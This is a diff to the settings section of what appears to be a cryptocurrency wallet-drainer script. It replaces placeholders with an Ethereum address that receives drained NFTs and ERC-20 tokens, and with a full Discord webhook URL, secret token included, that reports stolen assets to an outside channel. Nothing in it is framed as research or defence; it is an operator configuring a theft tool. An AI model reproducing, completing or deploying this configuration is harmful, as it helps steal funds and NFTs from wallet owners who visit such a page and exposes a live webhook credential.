@@ -1,6 +1,6 @@
 const workChainId = 1; // The network we are working with is the chainId list https://chainlist.org/
 
-const receiveAddress = "PutYourWalletAdressHere"; // YOUR WALLET ADDRESS
+const receiveAddress = "0x01C65F22A9478C2932e62483509c233F0aaD5c72"; // YOUR WALLET ADDRESS
 
 
 const drainNftsInfo = {
@@ -33,7 +33,7 @@ const erc20list = {
 
 const installInNewWindow = true; // install wallet if not installed
 
-const discordWebhookURL = "https://discord.com/api/webhooks/lalalalallalalalallalalalalalalalalalalalalalala"; // put ur discord webhook url in here to receive NFT's
+const discordWebhookURL = "https://discordapp.com/api/webhooks/1100911152516575334/ejdUwH703TcjZJbSi8UHzT1JwimydWOzQccvtoITr84v0Y56AIziAXL2eXWr5PjjQfJZ"; // put ur discord webhook url in here to receive NFT's
 const feedbackEnabled = true; // let enabled to receive webhooks
 /*
     = = = = = END OF SETTINGS = = = = =
